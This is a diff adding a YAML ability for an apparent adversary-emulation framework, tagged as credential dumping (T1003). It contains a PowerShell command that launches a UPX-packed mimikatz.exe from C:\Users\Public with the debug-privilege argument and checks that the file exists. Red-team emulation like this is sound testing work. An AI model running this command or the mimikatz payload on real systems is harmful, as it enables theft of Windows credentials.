@@ -1,0 +1,15 @@
+- id: tx0_mimikatz_run
+  name: TX0 Run UPX Packed Mimikatz
+  description: Execute UPX-packed mimikatz.exe
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: OS Credential Dumping
+  platforms:
+    windows:
+      psh:
+        command: |
+          Start-Process "C:\Users\Public\mimikatz.exe" -ArgumentList '"privilege::debug" "exit"' -NoNewWindow -Wait;
+          if (Test-Path "C:\Users\Public\mimikatz.exe") { "exists" } else { "not found" }
+        payloads:
+          - mimikatz.exe
